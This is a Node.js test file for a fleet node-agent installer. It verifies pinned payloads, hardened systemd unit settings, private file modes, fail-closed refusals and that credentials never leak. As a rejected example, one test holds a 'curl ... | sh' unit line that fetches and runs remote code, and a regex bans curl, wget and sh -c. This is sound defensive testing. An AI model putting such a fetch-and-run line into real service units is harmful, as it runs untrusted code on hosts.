import test from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmod, copyFile, mkdir, mkdtemp, readFile, writeFile, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  AGENT_CONFIG_HOME,
  AGENT_PAYLOAD_ARTIFACT,
  AGENT_STATE_HOME,
  AGENT_PAYLOAD_LITERAL,
  AGENT_UNIT_NAME,
  CONTROL_ACCOUNT,
  LINGER,
  NODE_JSON_PATH,
  NODE_TOKEN_PATH,
  PAYLOAD_PATH,
  REAL_AGENT_PAYLOAD_PATH,
  UNIT_PATH,
  WANT_PATH,
  agentPayloadSource,
  buildSelection,
  calls,
  exists,
  freshCheckpoint,
  linuxOnly,
  makeHost,
  readFixture,
  readJson,
  resetProviderIdentity,
  runCourier,
  sha256,
  setClaim,
} from "./support/capability-fixture.js";
import {
  AGENT_CONFIG_PATH,
  AGENT_PAYLOAD_MODE,
  AGENT_PAYLOAD_PATH,
  AGENT_USER_UNIT_NAME,
  CAPABILITY_BLOCK_BEGIN,
  CAPABILITY_BLOCK_END,
  SELECTED_CAPABILITY_SCHEMA,
  capabilitySelectionDigest,
  decodeCapabilitySelection,
  encodeCapabilitySelection,
  normalizeSelectedCapability,
  renderBootstrap,
} from "../src/index.js";

const here = dirname(fileURLToPath(import.meta.url));
const assetsDir = join(here, "..", "assets");
const fixturesDir = join(here, "fixtures");

function blockOf(script) {
  const start = script.indexOf(CAPABILITY_BLOCK_BEGIN);
  const end = script.indexOf(CAPABILITY_BLOCK_END);
  assert.ok(start > 0 && end > start, "the capability block must be rendered exactly once");
  return script.slice(start, end);
}

function withUnit(selection, patch) {
  return { ...selection, user_unit: { ...selection.user_unit, ...patch } };
}

test("the agent contract constants stay the documented production values", () => {
  assert.equal(AGENT_PAYLOAD_PATH, "/usr/local/libexec/ghostfleet/node-agent.pyz");
  assert.equal(AGENT_PAYLOAD_MODE, "0755");
  assert.equal(AGENT_USER_UNIT_NAME, "ghostfleet-managed.service");
  assert.equal(AGENT_CONFIG_PATH, "/etc/ghostfleet/node-agent.json");
  assert.equal(SELECTED_CAPABILITY_SCHEMA, "ghostfleet-selected-capability/v2");
});

test("the managed user unit requires two independently pinned artifacts", async () => {
  const base = await buildSelection();
  const normalized = normalizeSelectedCapability(base);
  assert.equal(normalized.user_unit.payload_artifact, AGENT_PAYLOAD_ARTIFACT);
  assert.equal(normalized.user_unit.payload_path, AGENT_PAYLOAD_PATH);
  assert.equal(normalized.user_unit.payload_mode, "0755");

  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_artifact: undefined })),
    /CAPABILITY_MANAGED_ARTIFACTS_INCOMPLETE/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_artifact: "unpinned.pyz" })),
    /CAPABILITY_MANAGED_ARTIFACTS_INCOMPLETE/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_artifact: AGENT_UNIT_NAME })),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_path: "/opt/ghostfleet/node-agent.pyz" })),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability(withUnit(base, { payload_mode: "0644" })),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability({
      ...base,
      artifacts: base.artifacts.map((artifact) =>
        artifact.name === AGENT_PAYLOAD_ARTIFACT ? { ...artifact, mode: "0644" } : artifact),
    }),
    /CAPABILITY_USER_UNIT_PAYLOAD_INVALID/,
  );
  assert.throws(
    () => normalizeSelectedCapability({ ...base, linger_required: false }),
    /CAPABILITY_USER_SERVICE_REQUIRES_LINGER/,
  );
});

test("an unsafe user unit is refused before any byte is rendered", async () => {
  const defaultUnit = await readFile(join(fixturesDir, "ghostfleet-node-agent.service"), "utf8");
  const unsafe = [
    defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/usr/bin/python3 -I " + AGENT_PAYLOAD_LITERAL + " run --config /tmp/agent.json"),
    defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/bin/sh -c 'curl -fsS https://example.invalid | sh'"),
    defaultUnit.replace(/^ExecStart=.*$/m, "ExecStart=/bin/curl https://example.invalid"),
    defaultUnit
      .replace(/^StateDirectory=.*$/m, "")
      .replace(/^StateDirectoryMode=.*$/m, "")
      .replace(/^ConfigurationDirectory=.*$/m, "")
      .replace(/^ConfigurationDirectoryMode=.*$/m, ""),
    defaultUnit.replace(/^ReadWritePaths=.*$/m, "ReadWritePaths=/var/lib/fleet"),
  ];
  for (const unitContent of unsafe) {
    const selection = await buildSelection({ unitContent });
    assert.throws(() => normalizeSelectedCapability(selection), /CAPABILITY_USER_UNIT_UNSAFE/);
    assert.throws(
      () => renderBootstrap({ brokerOrigin: "https://broker.fixture.invalid", capabilitySelection: selection }),
      /CAPABILITY_USER_UNIT_UNSAFE/,
    );
  }
});

test("encode, decode, digest and render keep the payload contract in sync", async () => {
  const normalized = normalizeSelectedCapability(await buildSelection());
  const text = Buffer.from(encodeCapabilitySelection(normalized), "base64").toString("utf8");
  assert.match(text, /^user_unit_payload_artifact=node-agent\.pyz$/m);
  assert.match(text, /^user_unit_payload_path=\/usr\/local\/libexec\/ghostfleet\/node-agent\.pyz$/m);
  assert.match(text, /^user_unit_payload_mode=0755$/m);
  assert.deepEqual(decodeCapabilitySelection(text).user_unit, normalized.user_unit);

  const block = blockOf(renderBootstrap({ brokerOrigin: "https://broker.fixture.invalid", capabilitySelection: await buildSelection() }));
  assert.match(block, /^CAPABILITY_USER_UNIT_PAYLOAD_ARTIFACT='node-agent\.pyz'$/m);
  assert.match(block, /^CAPABILITY_USER_UNIT_PAYLOAD_PATH='\/usr\/local\/libexec\/ghostfleet\/node-agent\.pyz'$/m);
  assert.match(block, /^CAPABILITY_USER_UNIT_PAYLOAD_MODE='0755'$/m);
  assert.doesNotMatch(block, /[A-Za-z0-9+/]{120,}={0,2}/);

  const digest = capabilitySelectionDigest(normalized);
  assert.match(digest, /^sha256:[0-9a-f]{64}$/);
  const baseline = await buildSelection();
  const reordered = normalizeSelectedCapability({ ...baseline, artifacts: [...baseline.artifacts].reverse() });
  assert.equal(capabilitySelectionDigest(reordered), digest);
  const relocated = normalizeSelectedCapability(await buildSelection({
    payloadPath: "/srv/libexec/ghostfleet/node-agent.pyz",
  }));
  assert.notEqual(capabilitySelectionDigest(relocated), digest);
});

test("the release unit asset pins the exact production launcher and passes the validator", async () => {
  const asset = await readFile(join(assetsDir, "ghostfleet-managed.service"), "utf8");
  // EOL-tolerant on purpose: the bytes are pinned by .gitattributes, but this
  // assertion must name the real defect (CRLF checkout or polluted asset)
  // instead of failing with a confusing ExecStart mismatch.
  const execLines = asset.split(/\r?\n/).filter((line) => line.startsWith("Exec"));
  assert.deepEqual(execLines, ["ExecStart=/usr/bin/python3 -I " + AGENT_PAYLOAD_LITERAL + " run"]);
  assert.match(asset, /^Type=notify$/m);
  assert.match(asset, /^NotifyAccess=main$/m);
  assert.match(asset, /^WatchdogSec=60$/m);
  // The unit process inherits the user manager's environment. A runner whose
  // manager was started for a different account left XDG_RUNTIME_DIR pointing at
  // /run/user/<other uid>, so every "systemctl --user" probe inside the agent
  // addressed the wrong bus, failed, and observe.unit_state mapped that to
  // "unknown" while the operator's systemctl said active. %t expands to the unit
  // owner's /run/user/<uid>, so the shipped launcher pins its own bus path
  // instead of depending on whatever the manager inherited.
  assert.deepEqual(
    asset.split(/\r?\n/).filter((line) => line.startsWith("Environment=")),
    ["Environment=PYTHONDONTWRITEBYTECODE=1", "Environment=XDG_RUNTIME_DIR=%t"],
  );
  assert.match(asset, /^ProtectSystem=strict$/m);
  assert.match(asset, /^ProtectHome=read-only$/m);
  assert.match(asset, /^StateDirectory=ghostfleet-agent$/m);
  assert.match(asset, /^ConfigurationDirectory=ghostfleet$/m);
  // The courier creates ~/.config/ghostfleet 0700 to hold the 0600 node token. A
  // ConfigurationDirectory defaulting to 0755 makes systemd warn on every start
  // ("already exists but the mode is different") and would create a group/world
  // readable token directory on a host where the courier never ran. Pin the mode
  // in the artifact, not in the courier only.
  assert.match(asset, /^ConfigurationDirectoryMode=0700$/m);
  // The agent writes private runtime state under its StateDirectory and reports
  // state_dir_permissions_loose when the directory is not 0700. systemd would
  // create it 0755 by default, so the release artifact must pin the mode (and
  // the courier must create the same private directory before the unit starts).
  assert.match(asset, /^StateDirectoryMode=0700$/m);
  assert.match(asset, /^ReadWritePaths=%h\/\.config\/ghostfleet %h\/\.local\/state\/ghostfleet-agent$/m);
  assert.doesNotMatch(asset, /--config|\bsh -c\b|\/bin\/sh|\bcurl\b|\bwget\b/);
  const normalized = normalizeSelectedCapability(await buildSelection({ unitContent: asset }));
  assert.equal(normalized.user_unit.payload_path, AGENT_PAYLOAD_PATH);
});

test("the fixture unit copy is the release asset plus comment lines only", async () => {
  // The fixture is what the test suite pins; the asset is what ships. Dropping
  // comments, the two files must be line-identical so a production directive can
  // never be added to one copy only.
  const asset = await readFile(join(assetsDir, "ghostfleet-managed.service"), "utf8");
  const fixture = await readFile(join(fixturesDir, "ghostfleet-node-agent.service"), "utf8");
  const body = (text) => text.split(/\r?\n/).filter((line) => line.trim() && !line.startsWith("#"));
  assert.deepEqual(body(fixture), body(asset));
});

test("the release unit assets are checked out with LF line endings only", async () => {
  // A digest-pinned release artifact whose checkout bytes depend on core.autocrlf
  // is not pinnable: Windows materializes CRLF, the pinned digest changes and the
  // courier stages a unit nobody reviewed. .gitattributes fixes the checkout; this
  // separately named assertion keeps a checkout-policy regression distinguishable
  // from a polluted asset.
  for (const [directory, name] of [
    [assetsDir, "ghostfleet-managed.service"],
    [fixturesDir, "ghostfleet-node-agent.service"],
  ]) {
    const text = await readFile(join(directory, name), "utf8");
    assert.equal(text.includes("\r"), false, name + " must be LF-only");
  }
});

test("the selection pins the payload source this checkout actually provides", async () => {
  const source = await agentPayloadSource();
  const normalized = normalizeSelectedCapability(await buildSelection());
  const row = normalized.artifacts.find((artifact) => artifact.name === normalized.user_unit.payload_artifact);
  assert.ok(row, "the selected payload artifact must be pinned in the artifacts list");
  assert.equal(row.sha256, sha256(source.bytes).slice("sha256:".length));
  if (source.real) {
    assert.equal(source.path, REAL_AGENT_PAYLOAD_PATH);
  } else {
    // Documented fallback: this checkout carries no rebuilt product payload, so
    // the synthetic fixture stands in. It is never presented as the agent.
    assert.equal(source.path, join(fixturesDir, AGENT_PAYLOAD_ARTIFACT));
  }
});

test("a rebuilt product payload wins over the synthetic fixture", { skip: linuxOnly }, async (t) => {
  const source = await agentPayloadSource();
  if (!source.real) {
    t.skip("packages/node-agent/dist/node-agent.pyz is absent in this checkout; the fixture fallback is what the selection pins");
    return;
  }
  const real = await readFile(REAL_AGENT_PAYLOAD_PATH);
  assert.deepEqual(source.bytes, real);
  const normalized = normalizeSelectedCapability(await buildSelection());
  const row = normalized.artifacts.find((artifact) => artifact.name === normalized.user_unit.payload_artifact);
  assert.equal(row.sha256, sha256(real).slice("sha256:".length));
});

test("the courier installs the pinned payload, unit, credential and public projection", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);

    const payloadSha = sha256(await readFile(PAYLOAD_PATH(host))).slice("sha256:".length);
    assert.equal((await stat(PAYLOAD_PATH(host))).mode & 0o777, 0o755);
    const unit = await readFile(UNIT_PATH(host), "utf8");
    assert.ok(unit.includes("ExecStart=/usr/bin/python3 -I " + host.payloadPath + " run\n"), unit);
    // A user unit that carries its own runtime directory cannot be steered onto
    // another account's bus by the inherited manager environment.
    assert.ok(unit.includes("Environment=XDG_RUNTIME_DIR=%t\n"), unit);
    assert.equal(await readFile(WANT_PATH(host), "utf8"), unit);
    assert.ok(await exists(LINGER(host)));

    assert.equal((await stat(AGENT_CONFIG_HOME(host))).mode & 0o777, 0o700);
    assert.equal((await stat(NODE_TOKEN_PATH(host))).mode & 0o777, 0o600);
    const token = (await readFile(NODE_TOKEN_PATH(host), "utf8")).trim();
    assert.match(token, /^[A-Za-z0-9_-]{43}$/);
    const nodeJson = await readJson(NODE_JSON_PATH(host));
    assert.equal((await stat(NODE_JSON_PATH(host))).mode & 0o777, 0o600);
    assert.ok(nodeJson.node_uid);
    assert.match(nodeJson.platform, /^linux-/);

    const projectionPath = join(host.etcGhostfleet, "capability-status.json");
    const projection = await readJson(projectionPath);
    assert.equal((await stat(projectionPath)).mode & 0o777, 0o644);
    assert.equal(projection.schema, "ghostfleet-capability-status/v1");
    assert.equal(projection.selection_schema, SELECTED_CAPABILITY_SCHEMA);
    assert.match(projection.selection_digest, /^sha256:[0-9a-f]{64}$/);
    assert.equal(projection.payload_sha256, payloadSha);
    assert.equal(projection.release_pin, selection.template_digest.slice("sha256:".length, "sha256:".length + 40));
    assert.equal(projection.control_account, CONTROL_ACCOUNT);
    assert.equal(projection.artifacts.length, 5);
    assert.equal(projection.user_unit.payload_sha256, payloadSha);
    assert.equal(projection.user_unit.payload_path, host.payloadPath);
    assert.deepEqual(projection.artifacts.map((artifact) => artifact.kind).sort(), ["helper", "installer", "key", "payload", "unit"]);
    assert.equal(JSON.stringify(projection).includes(token), false);

    // The agent reads this root-owned file at startup, so it must be valid JSON
    // and must name exactly the unit this lane installed. A malformed body here
    // would make a converged node look UNKNOWN to the agent.
    const agentConfigPath = join(host.etcGhostfleet, "node-agent.json");
    const agentConfig = await readJson(agentConfigPath);
    assert.equal((await stat(agentConfigPath)).mode & 0o777, 0o644);
    // The agent parser admits exactly this key set, requires numeric intervals
    // and rejects unknown top-level keys; the origin is the node-plane bridge,
    // not the Access-protected enrollment origin the broker is.
    assert.deepEqual(agentConfig, {
      control_plane_origin: "https://node-plane.fixture.invalid",
      heartbeat_interval_s: 30,
      heartbeat_interval_min_s: 30,
      heartbeat_interval_max_s: 300,
      allowed_units: [AGENT_USER_UNIT_NAME],
    });

    assert.match(result.stdout, /^capability_agent_payload_sha256=[0-9a-f]{64}$/m);
    assert.match(result.stdout, /^capability_agent_payload_path=\//m);
    assert.match(result.stdout, /^capability_agent_payload_state=INSTALLED$/m);
    assert.match(result.stdout, /^capability_agent_payload_owner=root:root$/m);
    assert.match(result.stdout, /^capability_agent_payload_mode=755$/m);
    assert.match(result.stdout, /^capability_user_unit_state=INSTALLED$/m);
    assert.match(result.stdout, /^capability_service_state=INSTALLED$/m);
    assert.match(result.stdout, /^capability_node_credential_received=yes$/m);
    assert.match(result.stdout, /^capability_node_token_mode=0?600$/m);
    assert.match(result.stdout, /^capability_node_token_type=regular$/m);
    // Both private directories are created 0700 by the courier and kept 0700 by
    // the shipped unit directives, and the report measures them rather than
    // asserting them in prose.
    assert.match(result.stdout, /^capability_agent_config_dir_mode=0?700$/m);
    assert.match(result.stdout, new RegExp("^capability_agent_config_dir_owner=" + CONTROL_ACCOUNT + "$", "m"));
    assert.match(result.stdout, /^capability_agent_state_dir_type=directory$/m);
    assert.match(result.stdout, /^capability_agent_state_dir_mode=0?700$/m);
    assert.match(result.stdout, new RegExp("^capability_agent_state_dir_owner=" + CONTROL_ACCOUNT + "$", "m"));
    assert.equal((await stat(AGENT_CONFIG_HOME(host))).mode & 0o777, 0o700);
    assert.equal((await stat(AGENT_STATE_HOME(host))).mode & 0o777, 0o700);
    assert.equal(result.stdout.includes(token), false);
    assert.equal(result.stderr.includes(token), false);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

// The agent configuration and the payload parser are owned by two different
// repositories, so the only contract that cannot drift silently is the one
// exercised here: replay the bytes the courier actually wrote through the
// payload own check-config. When a rebuilt agent artifact is present this
// runs against the real parser; otherwise it runs against the synthetic
// fixture, which models that parser rather than the product.
test("the generated agent configuration is accepted by the pinned payload", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  const work = await mkdtemp(join(tmpdir(), "gf-check-config-"));
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    const installed = await runCourier(host, null);
    assert.equal(installed.status, 0, installed.stderr);

    const configPath = join(host.etcGhostfleet, "node-agent.json");
    const configuration = JSON.parse(await readFile(configPath, "utf8"));
    assert.deepEqual(Object.keys(configuration).sort(), [
      "allowed_units",
      "control_plane_origin",
      "heartbeat_interval_max_s",
      "heartbeat_interval_min_s",
      "heartbeat_interval_s",
    ]);

    // check-config also checks the credential it would load, so replay the
    // courier-written token and a node record with the same shape. The node
    // record is synthesized with a protocol-valid uid because the fixture
    // claim uses a readable uid; the courier-written node.json is asserted in
    // the install lane test.
    const replayToken = join(work, "node-token");
    await copyFile(NODE_TOKEN_PATH(host), replayToken);
    await chmod(replayToken, 0o600);
    const replayNode = join(work, "node.json");
    const nodeUid = ["node", "01234567", "0123", "4123", "8123", "0123456789ab"].join("-");
    await writeFile(
      replayNode,
      JSON.stringify({ node_uid: nodeUid, platform: "linux", issued_at: "2026-01-02T03:04:05Z" }) + "\n",
      { mode: 0o600 },
    );
    const stateDir = join(work, "state");
    await mkdir(stateDir, { mode: 0o700 });

    const replay = {
      ...configuration,
      token_path: replayToken,
      node_meta_path: replayNode,
      state_dir: stateDir,
    };
    const replayPath = join(work, "replay.json");
    await writeFile(replayPath, JSON.stringify(replay) + "\n", { mode: 0o644 });

    const source = host.payloadSource;
    const accepted = spawnSync("python3", ["-I", source.path, "check-config", "--config", replayPath], {
      encoding: "utf8",
      timeout: 60000,
    });
    assert.equal(accepted.error, undefined, String(accepted.error));
    assert.equal(accepted.status, 0, accepted.stdout + accepted.stderr);
    const parsed = JSON.parse(accepted.stdout.trim().split("\n").pop());
    assert.equal(parsed.ok, true);
    assert.equal(parsed.command, "check-config");
    assert.equal(parsed.node_uid, nodeUid);
    assert.equal(parsed.allowed_units, 1);
    assert.equal(accepted.stdout.includes(await readFile(replayToken, "utf8")), false);

    // The body the courier used to write (schema, node_uid and a nested
    // interval object) is rejected by the same parser: this is the regression
    // that would have crash-looped the unit on a real node.
    const legacyPath = join(work, "legacy.json");
    await writeFile(
      legacyPath,
      JSON.stringify({
        schema: "ghostfleet-node-agent-config/v1",
        control_plane_origin: configuration.control_plane_origin,
        heartbeat_interval_s: { lower: 30, upper: 3600 },
        allowed_units: configuration.allowed_units,
        node_uid: nodeUid,
      }) + "\n",
      { mode: 0o644 },
    );
    const refused = spawnSync("python3", ["-I", source.path, "check-config", "--config", legacyPath], {
      encoding: "utf8",
      timeout: 60000,
    });
    assert.equal(refused.error, undefined, String(refused.error));
    assert.notEqual(refused.status, 0, "the legacy configuration body must be refused");
    assert.match(refused.stdout, /CONFIG_UNKNOWN_KEY|CONFIG_TYPE_INVALID/);
  } finally {
    await rm(work, { recursive: true, force: true });
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a repeat run keeps the payload and unit byte-identical", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    assert.equal((await runCourier(host, null)).status, 0);
    const payloadBefore = await readFile(PAYLOAD_PATH(host));
    const unitBefore = await readFile(UNIT_PATH(host), "utf8");
    await freshCheckpoint(host);
    await resetProviderIdentity(host);
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);
    assert.deepEqual(await readFile(PAYLOAD_PATH(host)), payloadBefore);
    assert.equal(await readFile(UNIT_PATH(host), "utf8"), unitBefore);
    assert.match(result.stdout, /^capability_agent_payload_state=COMPLIANT$/m);
    assert.match(result.stdout, /^capability_user_unit_state=COMPLIANT$/m);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("the managed lane refuses a missing, malformed or unseparated node-plane origin", { skip: linuxOnly }, async () => {
  const arms = [
    {
      label: "missing",
      env: { GHOSTFLEET_NODE_PLANE_ORIGIN: "" },
      code: "CAPABILITY_NODE_PLANE_ORIGIN_REQUIRED",
    },
    {
      label: "malformed",
      env: { GHOSTFLEET_NODE_PLANE_ORIGIN: "https://node-plane.fixture.invalid/path" },
      code: "CAPABILITY_NODE_PLANE_ORIGIN_INVALID",
    },
    {
      label: "unseparated",
      env: { GHOSTFLEET_NODE_PLANE_ORIGIN: "https://broker.fixture.invalid" },
      code: "CAPABILITY_NODE_PLANE_ORIGIN_NOT_SEPARATED",
    },
  ];
  for (const arm of arms) {
    const host = await makeHost();
    try {
      await freshCheckpoint(host);
      const selection = await host.buildSelection();
      await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
      const result = await runCourier(host, null, { env: arm.env });
      assert.notEqual(result.status, 0, arm.label + ": the lane must fail closed\n" + result.stderr);
      assert.ok(result.stderr.includes(arm.code), arm.label + ": " + result.stderr);
      // The origin is proved before any file is written, so a refused lane
      // installs no payload, no unit, no enablement link, no agent config and
      // no credential.
      assert.equal(await exists(PAYLOAD_PATH(host)), false, arm.label + ": payload installed");
      assert.equal(await exists(UNIT_PATH(host)), false, arm.label + ": unit installed");
      assert.equal(await exists(WANT_PATH(host)), false, arm.label + ": unit enabled");
      assert.equal(await exists(LINGER(host)), false, arm.label + ": linger enabled");
      assert.equal(await exists(NODE_TOKEN_PATH(host)), false, arm.label + ": node token written");
      assert.equal(await exists(AGENT_CONFIG_HOME(host)), false, arm.label + ": agent config dir created");
      assert.equal(await exists(join(host.etcGhostfleet, "node-agent.json")), false, arm.label + ": agent config written");
      assert.equal(await exists(join(host.etcGhostfleet, "capability-status.json")), false, arm.label + ": projection written");
    } finally {
      await rm(host.root, { recursive: true, force: true });
    }
  }
});

test("a drifted payload is replaced byte-exactly", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    assert.equal((await runCourier(host, null)).status, 0);
    await writeFile(PAYLOAD_PATH(host), "drifted payload\n", { mode: 0o755 });
    await freshCheckpoint(host);
    await resetProviderIdentity(host);
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);
    // Derive the expected digest from the selection this run actually pinned. A
    // hard-coded fixture digest is exactly the bug this assertion replaces: on a
    // checkout that ships the rebuilt product payload the fixture is not what the
    // courier installs.
    const normalized = normalizeSelectedCapability(await host.buildSelection());
    const pinned = normalized.artifacts.find((artifact) => artifact.name === normalized.user_unit.payload_artifact);
    assert.equal(sha256(await readFile(PAYLOAD_PATH(host))).slice("sha256:".length), pinned.sha256);
    assert.equal("sha256:" + pinned.sha256, host.payloadSha256);
    assert.match(result.stdout, /^capability_agent_payload_state=INSTALLED$/m);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a payload owned by another account is never chowned back into place", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    assert.equal((await runCourier(host, null)).status, 0);
    const markers = join(host.fixtureState, "stat-owner.tsv");
    await writeFile(markers, (await readFile(markers, "utf8")) + host.payloadPath + "|nobody:nogroup\n");
    await freshCheckpoint(host);
    await resetProviderIdentity(host);
    const result = await runCourier(host, null);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /CAPABILITY_AGENT_PAYLOAD_OWNER_UNSAFE/);
    assert.equal((await calls(host)).filter((line) => line.startsWith("chown ") && line.includes(host.payloadPath)).length, 0);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("an expired credential handoff fails closed before any service artifact exists", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    await writeFile(join(host.fixtureState, "complete-response.json"), JSON.stringify({ outcome: "COMPLETE", credential_handoff: "EXPIRED" }) + "\n");
    const result = await runCourier(host, null);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /CAPABILITY_NODE_CREDENTIAL_EXPIRED/);
    assert.equal(await exists(PAYLOAD_PATH(host)), false);
    assert.equal(await exists(UNIT_PATH(host)), false);
    assert.equal(await exists(LINGER(host)), false);
    assert.equal(await exists(join(host.etcGhostfleet, "capability-status.json")), false);
    assert.equal(await exists(NODE_TOKEN_PATH(host)), false);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a completion response without the node credential installs no user service", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    await writeFile(join(host.fixtureState, "complete-response.json"), JSON.stringify({ outcome: "COMPLETE" }) + "\n");
    const result = await runCourier(host, null);
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /CAPABILITY_NODE_CREDENTIAL_MISSING/);
    assert.equal(await exists(PAYLOAD_PATH(host)), false);
    assert.equal(await exists(UNIT_PATH(host)), false);
    assert.equal(await exists(LINGER(host)), false);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("a concurrent writer with a different token is refused instead of overwritten", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    const different = "fixture-second-token-" + "1".repeat(22);
    // Simulate another writer that stores a different credential while the courier
    // is still between the capability phase and the completion handoff.
    const result = await runCourier(host, null, {
      tamper: (script) => script.replace(
        "  capability_service_finish",
        '  install -d -m 0700 "' + AGENT_CONFIG_HOME(host) + '"\n' +
          '  printf %s "' + different + '" > "' + NODE_TOKEN_PATH(host) + '"\n' +
          '  chmod 600 "' + NODE_TOKEN_PATH(host) + '"\n' +
          '  printf \'%s\\n\' "' + NODE_TOKEN_PATH(host) + "|" + CONTROL_ACCOUNT + ":" + CONTROL_ACCOUNT + '" >> "' + join(host.fixtureState, "stat-owner.tsv") + '"\n' +
          "  capability_service_finish",
      ),
    });
    assert.notEqual(result.status, 0, result.stderr);
    assert.match(result.stderr, /CAPABILITY_NODE_CREDENTIAL_CONFLICT/);
    assert.equal((await readFile(NODE_TOKEN_PATH(host), "utf8")).trim(), different);
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("the release user unit passes systemd-analyze --user verify", { skip: linuxOnly }, async () => {
  const { execFile } = await import("node:child_process");
  const { promisify } = await import("node:util");
  const { mkdtemp, mkdir, copyFile, chmod } = await import("node:fs/promises");
  const { tmpdir } = await import("node:os");
  const run = promisify(execFile);
  const dir = await mkdtemp(join(tmpdir(), "ghostfleet-unit-verify-"));
  const unitFile = join(dir, AGENT_UNIT_NAME);
  try {
    await copyFile(join(assetsDir, "ghostfleet-managed.service"), unitFile);
    await chmod(unitFile, 0o644);
    // A --user invocation needs a private runtime directory. CI runs this as a
    // normal user with /run/user/<uid> present, but a root-owned container (the
    // disposable lane, or a WSL root shell) has none, so provide one explicitly.
    const runtimeDir = join(dir, "runtime");
    await mkdir(runtimeDir, { recursive: true, mode: 0o700 });
    const env = { ...process.env, XDG_RUNTIME_DIR: runtimeDir };
    let outcome = null;
    try {
      outcome = await run("systemd-analyze", ["--user", "verify", unitFile], { timeout: 60000, env });
    } catch (error) {
      // A missing systemd-analyze must fail loudly: the acceptance contract
      // requires this verification, so a silent skip would hide a broken unit.
      assert.fail("systemd-analyze --user verify failed for the release user unit: " + String(error.stderr || error.message));
    }
    assert.equal(typeof outcome.stdout, "string");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("the public projection never carries a credential", { skip: linuxOnly }, async () => {
  const host = await makeHost();
  try {
    await freshCheckpoint(host);
    const selection = await host.buildSelection();
    await setClaim(host, { capability_required: true, capability_selection: encodeCapabilitySelection(selection) });
    const result = await runCourier(host, null);
    assert.equal(result.status, 0, result.stderr);
    const token = (await readFile(NODE_TOKEN_PATH(host), "utf8")).trim();
    const state = await readFile(join(host.checkpoint, "capability-state.json"), "utf8");
    const projection = await readFile(join(host.etcGhostfleet, "capability-status.json"), "utf8");
    for (const text of [result.stdout, result.stderr, state, projection]) {
      assert.equal(text.includes(token), false);
      assert.equal(text.includes("handoff_id"), false);
    }
  } finally {
    await rm(host.root, { recursive: true, force: true });
  }
});

test("the fixture payload is synthetic and yields to a rebuilt agent artifact", async () => {
  const selection = await buildSelection();
  const payload = selection.artifacts.find((artifact) => artifact.name === AGENT_PAYLOAD_ARTIFACT);
  assert.ok(payload, "the selection must pin the agent payload");
  const readme = await readFile(join(fixturesDir, "README.md"), "utf8");
  assert.match(readme, /synthetic/i, "the fixture directory must state that its payload is synthetic");
  if (await exists(REAL_AGENT_PAYLOAD_PATH)) {
    // An integration checkout carries the frozen payload; the same tests must
    // exercise those exact bytes instead of the synthetic stand-in.
    const rebuilt = await readFile(REAL_AGENT_PAYLOAD_PATH);
    assert.ok(Buffer.isBuffer(payload.content), "a real payload is binary");
    assert.equal(Buffer.compare(payload.content, rebuilt), 0);
  } else {
    const synthetic = await readFixture(AGENT_PAYLOAD_ARTIFACT);
    const content = Buffer.isBuffer(payload.content) ? payload.content.toString("utf8") : payload.content;
    assert.equal(content, synthetic);
    assert.match(synthetic, /synthetic/i, "the fixture payload must label itself as synthetic");
    assert.equal(readme.includes("not the product agent"), true);
  }
});
